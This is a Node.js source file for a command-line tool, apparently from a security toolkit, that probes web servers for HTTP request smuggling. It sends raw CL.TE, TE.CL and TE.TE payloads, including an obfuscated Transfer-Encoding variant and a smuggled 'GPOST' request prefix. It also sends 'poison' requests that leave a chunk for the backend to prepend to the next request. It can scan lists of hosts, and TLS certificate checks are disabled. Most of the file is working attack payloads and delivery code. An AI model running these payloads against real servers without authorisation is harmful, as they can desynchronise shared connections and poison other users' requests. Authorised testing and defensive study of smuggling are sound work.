// smuggle.js — HTTP request smuggling probes with timing evidence.
// Copyright (c) 2026 0xnothings
// @tool smuggle
// @desc Probe for HTTP request smuggling (CL.TE / TE.CL / TE.TE) using raw sockets and timing differentials
// @usage node tools/smuggle.js example.com --port 443 --json
// @tags security,web,http
import net from 'node:net';
import tls from 'node:tls';
import { args, get, num, flag, die, inputLines, table } from '../_lib.js';

const o = args(process.argv.slice(2));
if (o.f.help) {
  console.log(`smuggle — HTTP request smuggling prober (CL.TE / TE.CL / TE.TE)

  node tools/smuggle.js <host|list.txt|-> [options]

  --port <n>       target port (default: 443 with TLS, 80 for --plain)
  --path <p>       request path (default: /)
  --plain          use plaintext HTTP instead of TLS
  --host-header <h> Host header value (default: the target host)
  --technique <t>  clte | tecl | tete | all (default: all)
  --rounds <n>     timing rounds per technique (default: 3)
  --timeout <ms>   socket timeout (default: 10000)
  --json           machine-readable output
  -h, --help       this text

  Evidence: response-boundary desync (two responses for one request),
  timeout differential between the poison-preceded and baseline request,
  and reflected smuggled prefix.`);
  process.exit(0);
}

// process.exit() after a fetch deadlocks libuv on Windows; halting via a thrown
// sentinel keeps the exit code intact without tripping the async handle assert.
class ExitSignal extends Error { constructor() { super('exit-signal'); this.__exitSignal = true; } }
const __exitGuard = (e) => { if (!e || !e.__exitSignal) { process.stderr.write(String(e && e.stack || e) + '\n'); process.exitCode = 1; } };
process.on('uncaughtException', __exitGuard);
process.on('unhandledRejection', __exitGuard);
const exitSoon = (code = 0) => { process.exitCode = code; throw new ExitSignal(); };
const timeout = num(get(o, 'timeout'), 10000);
const rounds = num(get(o, 'rounds'), 3);
const path = String(get(o, 'path', '/'));
const plain = flag(o, 'plain');
const technique = String(get(o, 'technique', 'all')).toLowerCase();
const portDef = num(o.f.port, plain ? 80 : 443);
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

function rawRequest(host, port, payload, useTls, ms) {
  return new Promise((resolve) => {
    const chunks = [];
    let done = false;
    const started = Date.now();
    const fin = (err) => {
      if (done) return;
      done = true;
      clearTimeout(t);
      try { sock.destroy(); } catch { /* ignore */ }
      resolve({ ms: Date.now() - started, text: Buffer.concat(chunks).toString('latin1'), error: err || null, bytes: Buffer.concat(chunks).length });
    };
    let sock;
    const onConnect = () => { sock.write(payload); };
    if (useTls) {
      sock = tls.connect({ host, port, servername: host, rejectUnauthorized: false, timeout: ms }, onConnect);
    } else {
      sock = net.connect({ host, port }, onConnect);
    }
    const t = setTimeout(() => fin('timeout'), ms);
    sock.on('data', (c) => { chunks.push(c); if (Buffer.concat(chunks).length > 65536) fin(null); });
    sock.on('error', (e) => fin(e.code || e.message));
    sock.on('close', () => fin(null));
  });
}

function techniques(hostHdr) {
  const t = {};
  t.clte = `POST ${path} HTTP/1.1\r\nHost: ${hostHdr}\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG`;
  t.tecl = `POST ${path} HTTP/1.1\r\nHost: ${hostHdr}\r\nContent-Length: 3\r\nTransfer-Encoding: chunked\r\n\r\n8\r\nSMUGGLED\r\n0\r\n\r\n`;
  t.tete = `POST ${path} HTTP/1.1\r\nHost: ${hostHdr}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: x\r\n\r\n5c\r\nGPOST /smuggled HTTP/1.1\r\nHost: ${hostHdr}\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n`;
  t.tete_obf = `POST ${path} HTTP/1.1\r\nHost: ${hostHdr}\r\nContent-Length: 4\r\nTransfer-Encoding:\tchunked\r\nTransfer-Encoding: x\r\n\r\n5c\r\nGPOST /smuggled HTTP/1.1\r\nHost: ${hostHdr}\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n`;
  t.clte_smuggle = `POST ${path} HTTP/1.1\r\nHost: ${hostHdr}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n5c\r\nGPOST /smuggled HTTP/1.1\r\nHost: ${hostHdr}\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n`;
  return t;
}

function baseline(hostHdr) {
  return `GET ${path} HTTP/1.1\r\nHost: ${hostHdr}\r\nConnection: close\r\nUser-Agent: smuggle/1.0\r\n\r\n`;
}

function poisonProbe(hostHdr, variant) {
  // Poison request leaves a trailing chunk the backend will prepend to the next request.
  return `POST ${path} HTTP/1.1\r\nHost: ${hostHdr}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nConnection: keep-alive\r\n\r\n1\r\nZ\r\nQ`;
}

const countResponses = (text) => (text.match(/HTTP\/1\.[01] \d{3}/g) || []).length;

let entries = o._.length ? o._ : ['-'];
let hosts = [];
for (const e of entries) {
  if (e === '-' || /\.txt$/.test(e)) hosts.push(...(await inputLines(e)));
  else hosts.push(e);
}
hosts = [...new Set(hosts.filter(Boolean))];
if (!hosts.length) die('no host given');

const results = [];
for (const raw of hosts) {
  const clean = raw.replace(/^https?:\/\//, '').split('/')[0];
  const useTls = !plain && !/^http:\/\//.test(raw);
  const [h, p] = clean.includes(':') ? clean.split(':') : [clean, portDef];
  const host = h.trim(), port = Number(p) || portDef;
  const hostHdr = String(get(o, 'host-header', host));
  const rec = { host, port, tls: useTls, tests: [], findings: [] };

  const base = await rawRequest(host, port, baseline(hostHdr), useTls, timeout);
  rec.baseline = { ms: base.ms, statuses: countResponses(base.text), error: base.error };
  await sleep(200);

  const all = techniques(hostHdr);
  const keys = technique === 'all' ? ['clte', 'tecl', 'tete', 'clte_smuggle'] : [technique];
  for (const k of keys) {
    if (!all[k]) continue;
    const res = await rawRequest(host, port, all[k], useTls, timeout);
    const statuses = countResponses(res.text);
    const ev = [];
    let verdict = null;
    if (statuses >= 2) { ev.push(`desync: ${statuses} responses for one request`); verdict = 'HIGH'; }
    if (/GPOST|SMUGGLED|^\s*Z\s*$/m.test(res.text)) { ev.push('smuggled prefix reflected in response'); verdict = 'CRITICAL'; }
    if (/400 Bad Request/i.test(res.text) && statuses >= 2) { ev.push('backend rejected the smuggled chunk after front-end accepted'); verdict = verdict || 'MEDIUM'; }
    if (!res.error && base.ms && res.ms > base.ms * 2.5 && res.ms - base.ms > 900) { ev.push(`timing differential ${res.ms}ms vs baseline ${base.ms}ms`); verdict = verdict || 'MEDIUM'; }
    rec.tests.push({
      technique: k, ms: res.ms, statuses, bytes: res.bytes, error: res.error,
      verdict, evidence: ev, sample: res.text.split('\r\n').slice(0, 6).join(' | ').slice(0, 200),
    });
    await sleep(250);
  }

  // Timing-based confirmation: hold the connection open after a poisoned request.
  for (let i = 0; i < rounds; i++) {
    const t0 = Date.now();
    const p1 = await rawRequest(host, port, poisonProbe(hostHdr), useTls, timeout);
    const p2 = await rawRequest(host, port, baseline(hostHdr), useTls, timeout);
    const delta = p2.ms - p1.ms;
    rec.tests.push({
      technique: `timing-round-${i + 1}`, ms: delta, statuses: countResponses(p2.text),
      bytes: p2.bytes, error: p2.error,
      verdict: Math.abs(delta) > 1500 ? 'MEDIUM' : null,
      evidence: Math.abs(delta) > 1500 ? [`poison/pre/post differential ${delta}ms (possible CL.TE queue wedge)`] : [],
      sample: (p2.text.split('\r\n')[0] || '').slice(0, 120),
    });
    await sleep(300);
  }

  rec.findings = rec.tests.filter((t) => t.verdict);
  results.push(rec);
  await sleep(200);
}

if (flag(o, 'json')) { console.log(JSON.stringify(results, null, 2)); exitSoon(results.some((r) => r.findings.length) ? 1 : 0); }

for (const r of results) {
  console.log(`\n### ${r.host}:${r.port} (${r.tls ? 'tls' : 'plain'})  baseline ${r.baseline.ms}ms / ${r.baseline.statuses} response(s)`);
  console.log(table(r.tests.map((t) => ({
    technique: t.technique, ms: t.ms ?? '', responses: t.statuses, bytes: t.bytes ?? '',
    verdict: t.verdict || '-', evidence: (t.evidence[0] || t.error || '').slice(0, 50),
  }))));
  if (r.findings.length) {
    console.log(`FINDINGS for ${r.host}:`);
    for (const f of r.findings) console.log(`  [${f.verdict}] ${f.technique}: ${f.evidence.join('; ')}`);
    console.log(`  sample: ${r.findings[0].sample}`);
  }
}
const total = results.reduce((n, r) => n + r.findings.length, 0);
console.log(`\n${results.length} target(s) probed, ${total} smuggling indicator(s)`);
exitSoon(total ? 1 : 0);
